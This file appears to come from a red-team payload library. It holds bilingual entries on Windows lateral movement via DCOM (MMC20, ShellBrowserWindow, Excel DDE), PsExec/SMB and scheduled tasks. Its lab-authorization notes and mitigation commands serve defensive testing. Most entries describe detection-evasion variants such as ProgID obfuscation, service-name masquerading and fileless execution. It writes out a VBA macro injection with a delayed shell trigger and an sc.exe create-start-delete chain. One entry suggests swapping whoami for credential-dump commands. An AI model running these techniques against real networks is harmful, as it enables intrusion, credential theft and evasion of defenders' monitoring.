description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_ATEXEC_E_1 with blue-team logs; the scheduled task running and returning whoami output with event 4698 confirming creation confirms success.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_ATEXEC_E_2 与蓝队日志；成功时任务以 SYSTEM 创建并被 /run 立即触发执行（命令输出需经输出转存共享方式取回），蓝队可见 4698 任务创建事件。
description.en: Create a one-shot scheduled task on the target; the task executing at the specified time with events 4698/4699 recorded confirms success.

name.zh: DCOM 远程激活授权验证

description.zh: 通过 DCOM（MMC20/ShellWindows 等）远程激活执行命令，验证 COM 服务器的授权配置。
description.en: Instantiates remote COM objects such as MMC20.Application and calls their ExecuteShellCommand-style methods over DCOM, verifying the COM activation authorization boundary and its sparse telemetry.

overview.zh: DCOM 远程激活授权验证覆盖 COM 远程激活场景：针对持有目标主机本地管理员凭据的测试主体，验证能否经 135 端口远程实例化危险 COM 对象并执行命令。验证维度涵盖 MMC20.Application、ShellBrowserWindow CLSID 与 Excel DCOM 三种常用对象。
overview.en: DCOM Remote-Activation Authorization Validation covers COM remote activation: for a test principal holding the target's local administrator credentials, verify whether dangerous COM objects can be instantiated remotely over port 135 to execute commands. Verification dimensions cover MMC20.Application, the ShellBrowserWindow CLSID, and Excel DCOM.

vulnerability.zh: 根因是 DCOM 激活权限默认允许管理员组远程实例化 COM 服务器，而 MMC20、ShellBrowserWindow 等对象暴露 ExecuteShellCommand/ShellExecute 类方法；凭据复用使攻击者不创建服务或计划任务即可获得命令执行，痕迹仅剩 DCOM 激活进程链。
vulnerability.en: The root cause is that DCOM launch permissions by default let administrators instantiate COM servers remotely, and objects such as MMC20 and ShellBrowserWindow expose ExecuteShellCommand/ShellExecute-style methods; credential reuse grants command execution without creating services or scheduled tasks, leaving only the DCOM activation process chain as a trace.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 GetTypeFromProgID 远程实例化 MMC20.Application 并调用 ExecuteShellCommand 执行 whoami，目标出现 DCOM 激活来源的进程即确认成功；第 2 步用 ShellBrowserWindow CLSID 调用 ShellExecute 复现执行；第 3 步用 Excel DCOM 触发 DDEInitiate 验证 DDE 链路，calc 或 cmd 进程出现即确认。三条路径均无需文件落盘；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 instantiates MMC20.Application remotely via GetTypeFromProgID and invokes ExecuteShellCommand to run whoami — a process with a DCOM-activation origin on the target confirms success; step 2 replays execution through the ShellBrowserWindow CLSID via ShellExecute; step 3 triggers DDEInitiate through Excel DCOM — a calc or cmd process confirms the DDE path. All three leave no files on disk; replace LAB_* placeholders via the global variables menu.

mitigation.zh:
DCOM 激活与访问权限收紧到管理网段专用账号，禁用不需要的 COM 服务器远程激活，防火墙限制 135，监控 DCOM 进程链 4688：
    New-NetFirewallRule -DisplayName "Block-RPC-135" -Direction Inbound -Protocol TCP -LocalPort 135 -Action Block
    reg add HKLM\SOFTWARE\Microsoft\Ole /v EnableDCOM /t REG_SZ /d "N" /f
    AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enable
    修复后用第 1 步样例回归，远程激活应返回 E_ACCESSDENIED。
mitigation.en: Tighten DCOM launch and access permissions to dedicated accounts from the management segment, disable remote activation of unneeded COM servers, and restrict port 135 with host firewalls; monitor 4688 process creations whose parent is a DCOM service. After the fix, regress with the step 1 sample: remote activation must return E_ACCESSDENIED.

title.zh: 激活 MMC20 执行远程命令

description.zh: 远程实例化 MMC20.Application 后调 ExecuteShellCommand 执行 cmd /c whoami；目标出现命令回显或新进程即 DCOM 横向成功。
description.en: Instantiate MMC20.Application remotely and call ExecuteShellCommand with cmd /c whoami; output or a new process on the target confirms DCOM lateral movement.

title.zh: 更换对象规避检测规则

description.zh: 以 CLSID C08AFD90 激活 ShellBrowserWindow 并调 ShellExecute 执行命令；命令照常执行即绕过紧盯 MMC20 的检测规则。
description.en: Activate ShellBrowserWindow via CLSID C08AFD90 and call ShellExecute; commands still executing means MMC20-focused detection rules are dodged.

title.zh: Excel DDE 触发命令执行

description.zh: 远程激活 Excel.Application 后调 DDEInitiate 执行 cmd /c calc.exe；目标出现计算器进程即 Office 组件可作横向载体执行任意命令。
description.en: Activate Excel.Application remotely and DDEInitiate cmd /c calc.exe; calc appearing on the target shows Office components carry arbitrary commands laterally.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DCOM Remote-Activation Authorization Validation are authorized in writing and reversible.

description.zh: 绕过对 MMC20.Application ProgID 的高频检测规则：换 ShellWindows CLSID 激活路径，行为等价。成功判据：d.txt 生成于目标。
description.en: Evades high-frequency detection on the MMC20.Application ProgID by switching to the equivalent ShellWindows CLSID activation. Success: d.txt appears on the target.

description.zh: 绕过对 ProgID 字符串的静态特征匹配：运行期拼接 ProgID 再解析。成功判据：实例创建成功且静态扫描无完整 ProgID 字符串。
description.en: Evades static ProgID string matching by assembling the ProgID at runtime before resolution. Success: instance creation succeeds with no complete ProgID string for static scans.

title.zh: Excel DDE 输出转存规避变体

description.zh: 绕过 Excel 进程的命令行参数审计：DDE 公式执行并将输出转存共享，进程参数无敏感内容。成功判据：x.txt 含 whoami 输出。
description.en: Evades Excel process command-line auditing by executing via a DDE formula with output redirected to a share, keeping process args clean. Success: x.txt contains the whoami output.

title.zh: ExecuteShellCommand 参数混淆规避变体

description.zh: 绕过对命令行参数的监控：环境变量路径+运行期拼接参数+非常规显示参数。成功判据：m.txt 生成。
description.en: Evades command-line argument monitoring via env-var paths, runtime-joined arguments, and an unusual show parameter. Success: m.txt appears.

title.zh: MMC20 大小写 ProgID 规避变体

description.zh: 绕过 ProgID 精确字符串匹配：大小写混合仍可解析激活。成功判据：m2.txt 生成。
description.en: Evades exact ProgID string matching since mixed case still resolves for activation. Success: m2.txt appears.

title.zh: ShellWindows 等价替代规避变体

description.zh: 绕过 MMC20 专项检测：等价的 Shell Browser Window CLSID 执行路径。成功判据：m3.txt 生成。
description.en: Evades MMC20-specific detection by using the equivalent Shell Browser Window CLSID execution path. Success: m3.txt appears.

title.en: MMC DCOM Activation-Permission Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_DCOM_MMC_E_1 与蓝队日志；成功时通过 MMC20 ExecuteShellCommand 在目标启动进程，进程链可见 DCOM 激活来源。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_DCOM_MMC_E_1 with blue-team logs; MMC20 ExecuteShellCommand spawning a process on the target with a DCOM-activation lineage confirms success.

title.en: MMC DCOM Activation-Permission Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_DCOM_MMC_E_2 与蓝队日志；成功时 dcomexec 返回远程命令交互输出。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_DCOM_MMC_E_2 with blue-team logs; dcomexec returning interactive remote command output confirms success.

title.zh: DDE 公式编码规避变体

description.zh: 绕过对 =CMD| 公式明文的文档/内存扫描：运行期拼接公式字符串。成功判据：e.txt 生成且静态扫描无完整公式。
description.en: Evades plaintext =CMD| formula scanning in documents/memory by assembling the formula at runtime. Success: e.txt appears with no complete formula for static scans.

description.zh: 绕过 DDE 单元格告警：以 XLL 插件加载路径执行，Excel 内无公式痕迹。成功判据：XLL 被加载执行。
description.en: Evades DDE cell alerts by executing via XLL plugin load, leaving no formula traces in the workbook. Success: the XLL loads and executes.

wafBypass.command: $wb=$com.Workbooks.Add(); $wb.VBProject.VBComponents.Add(1).CodeModule.AddFromString('Sub Auto_Open()' + [char]10 + 'Application.OnTime Now+TimeValue("00:02:00"),"Run"' + [char]10 + 'End Sub' + [char]10 + 'Sub Run()' + [char]10 + 'Shell "cmd /c whoami > C:\Windows\Temp\m4.txt"' + [char]10 + 'End Sub');

description.zh: 宏延迟触发规避变体 — 绕过打开即执行的宏检测沙箱：Auto_Open 经 Application.OnTime 延迟两分钟再触发 Run 过程执行命令；前置为远程写入宏需目标 Excel 已启用"信任对 VBA 工程对象模型的访问"。成功判据：约两分钟后目标生成 C:\Windows\Temp\m4.txt。
description.en: Evades open-and-execute macro sandboxes by having Auto_Open defer two minutes before triggering. Success: the action occurs after the delay.

title.zh: 远程激活 Excel 实例
title.en: Excel DCOM Activation and DDE Protection Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_DCOM_EXCEL_E_1 与蓝队日志；成功时远程创建 Excel.Application 实例，目标出现 EXCEL.EXE 进程。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_DCOM_EXCEL_E_1 with blue-team logs; a remote Excel.Application instance with EXCEL.EXE on the target confirms success.

description.zh: 通过 Excel DDE 单元格执行命令；成功时目标启动 calc 或 cmd 进程。
description.en: Execute a command through an Excel DDE cell; calc or cmd spawning on the target confirms success.

explanation.zh: Excel DDE 公式：topic 含空格时必须用单引号包裹（PowerShell 单引号字符串内用两个连续单引号转义），A0 为目标单元格
explanation.en: Excel DDE formula: a topic containing spaces must be wrapped in single quotes (escaped as two single quotes inside a PowerShell single-quoted string); A0 is the target cell

title.en: Excel DCOM Activation and DDE Protection Audit Reviewed Command 3

description.zh: dcomexec.py 仅支持 ShellWindows/ShellBrowserWindow/MMC20 三种对象，不支持 Excel.Application；本条改用受支持的 ShellBrowserWindow 作为 dcomexec 执行样例。成功时 dcomexec 返回远程命令交互输出。
description.en: dcomexec.py accepts only the ShellWindows, ShellBrowserWindow, and MMC20 objects, not Excel.Application; this entry uses the supported ShellBrowserWindow as its dcomexec execution sample.; dcomexec returning interactive remote command output confirms success.

description.zh: 通过 MMC20 DCOM 在目标主机执行命令；成功时返回 whoami 输出，目标出现由 DCOM 激活创建的进程。
description.en: Execute a command on the target host via MMC20 DCOM; returned whoami output with a DCOM-activation-spawned process on the target confirms success.

description.zh: 通过 ShellBrowserWindow CLSID 远程执行；成功时目标启动 cmd /c whoami 并返回输出。
description.en: Execute remotely via the ShellBrowserWindow CLSID; the target launching cmd /c whoami and returning output confirms success.

description.zh: 通过 Excel DCOM 触发 DDEInitiate；成功时目标启动 cmd 或 calc 进程，证明 DDE 链路可达。
description.en: Trigger DDEInitiate via Excel DCOM; cmd or calc spawning on the target confirms the DDE path is reachable.

name.zh: PsExec/SMB 远程服务执行

description.zh: 以授权凭据经 SMB/ADMIN$ 部署服务执行命令，验证远程服务执行边界与对应检测信号。
description.en: Deploys and starts a service over SMB/ADMIN$ with authorized credentials to run commands on the remote host, exercising the remote-service execution boundary and its 7045 service-creation detection signal.

overview.zh: PsExec/SMB 远程服务边界验证覆盖 SMB 远程执行场景：针对拿到有效凭据或 NTLM 哈希的测试主体，验证能否经 445 端口在目标主机创建服务并执行命令。验证维度涵盖明文密码、哈希传递、远程单命令执行与原生 PsExec 四种入口。
overview.en: PsExec/SMB Remote-Service Boundary Validation covers SMB remote execution: for a test principal holding valid credentials or an NTLM hash, verify whether a service can be created on the target via port 445 to execute commands. Verification dimensions cover plaintext password, pass-the-hash, single remote command, and native PsExec entries.

vulnerability.zh: 根因是 SMB 服务与管理共享（ADMIN$）允许特权主体远程创建并启动服务，服务进程继承 SYSTEM 权限；弱口令、NTLM 哈希泄露或本地管理员凭据复用，使攻击者绕过交互式登录直接在目标侧执行任意命令。
vulnerability.en: The root cause is that the SMB service and the ADMIN$ share let privileged principals remotely create and start services whose processes inherit SYSTEM; weak passwords, leaked NTLM hashes, or reused local-admin credentials let an attacker execute arbitrary commands on the target without interactive logon.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用实验账号密码建立 psexec 交互 shell，whoami 显示 SYSTEM（nt authority\system）上下文且目标侧出现 7045 服务创建事件即确认成功；第 2 步改用 -hashes 以 NTLM 哈希认证，目标记录 4624 NTLM 网络登录即确认哈希可用；第 3 步远程执行 whoami 验证命令回传；第 4 步用原生 PsExec.exe 复现并确认临时服务创建后被清理。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 establishes an interactive psexec shell with the lab account password — whoami returning the target context plus a 7045 service-creation event on the target confirms success; step 2 switches to -hashes for NTLM authentication — a 4624 NTLM logon recorded on the target confirms the hash works; step 3 executes whoami remotely to verify command return; step 4 replays with native PsExec.exe and confirms the temporary service is cleaned up. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
445 仅管理网段可达，强制 SMB 签名与 EPA，本地管理员隔离并以 LAPS 轮换，7045/4624 实时告警：
    Set-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)" -RemoteAddress 10.0.10.0/24
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    Update-LapsADSchema
    Set-LapsADComputerSelfPermission -Identity "OU=Servers,DC=corp,DC=local"
    修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict port 445 to the management segment, enable SMB signing and EPA, enforce local administrator isolation with LAPS rotation, and adopt tiered admin accounts; alert in real time on 7045 service creation and anomalous 4624 logons. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

title.zh: 口令登录建立远程执行

description.zh: 用 psexec.py 以域账号口令登录目标；返回 SYSTEM 交互 shell 即远程服务执行通道打通，可执行任意命令。
description.en: Log into the target with psexec.py using domain credentials; a SYSTEM interactive shell means the remote service execution channel is open.

description.zh: 改用 -hashes 传入 NTLM 哈希登录同批主机；无需明文口令拿到 shell 即哈希可复用，覆盖只有哈希的场景。
description.en: Switch to -hashes with the NTLM hash for the same fleet; shells without the plaintext password prove hash reuse and cover hash-only situations.

title.zh: 定向执行命令收割结果
title.en: Run targeted commands to harvest results

description.zh: 在登录命令后追加 whoami 等指令；回显 SYSTEM 上下文即确认执行身份，可批量替换为凭据收集与侦察命令。
description.en: Append commands like whoami after the login; a SYSTEM context echoed back confirms the execution identity and can be swapped for credential dump and recon commands.

title.zh: 原生 PsExec 落地横向

description.zh: 在跳板机用 PsExec.exe \目标 -u 域\账号 -p 口令 启动 cmd.exe；新 shell 属于目标主机即完成原生工具横向，动作仅表现为服务安装。
description.en: From the pivot host run PsExec.exe \\target -u domain\user -p password to launch cmd.exe; the new shell belonging to the target completes native lateral movement, visible only as service installation.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 PsExec/SMB 远程服务边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PsExec and SMB Remote-Service Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: PsExec/SMB 远程服务边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PsExec and SMB Remote-Service Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 服务二进制落盘与 7045 事件是双检测点——复用 PSEXESVC 命名形态、实验后清理服务与文件；多主机串行执行避免并发告警风暴。
opsecTips.en: Service-binary drops and 7045 events are both detection points — mirror the PSEXESVC naming shape, clean up the service and files afterwards, and run hosts serially to avoid a concurrent alert storm.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 服务名伪装规避变体 — 绕过对默认服务名（如 smbexec 的 BTOBTO、psexec 的随机字母串）的 EDR 特征：伪装为系统管理风格服务名。成功判据：半交互 shell 建立且服务名不在检测名单。
description.en: Evades EDR signatures on default random-caps service names by masquerading as a sysadmin-style name. Success: semi-interactive shell establishes with a service name off detection lists.

description.zh: 绕过 admin$ 二进制落盘检测（PSEXESVC.exe 落盘告警）：SMBExec 经服务批处理执行不落盘。成功判据：shell 可用且目标无新 EXE 落盘。
description.en: Evades admin$ binary drop detection (PSEXESVC.exe landing alerts) since SMBExec executes via service batches without dropping a binary. Success: shell works and no new EXE lands on the target.

title.zh: 原生 sc.exe 组合规避变体

wafBypass.command: sc \\{LAB_HOST} create W32TimeUpdate binPath= "cmd /c whoami > C:\Windows\Temp\o.txt" && sc \\{LAB_HOST} start W32TimeUpdate && sc \\{LAB_HOST} delete W32TimeUpdate

description.zh: 绕过 impacket 脚本流量指纹：全程原生 sc.exe 创建/启动/删除，动作分散于三个低噪操作。成功判据：服务启动成功且 o.txt 生成。
description.en: Evades impacket script traffic fingerprints by doing everything with native sc.exe create/start/delete spread across three low-noise operations. Success: service starts and o.txt appears.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 与蓝队日志；成功时获得目标交互式 shell 且 whoami 显示 SYSTEM（nt authority\system）上下文，蓝队可见 7045 服务创建事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 with blue-team logs; an interactive shell on the target with whoami showing the lab user context, plus event 7045 service creation, confirms success.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_2 with blue-team logs; authenticating with the NTLM hash and opening a target shell, with event 4624 NTLM logon, confirms success.
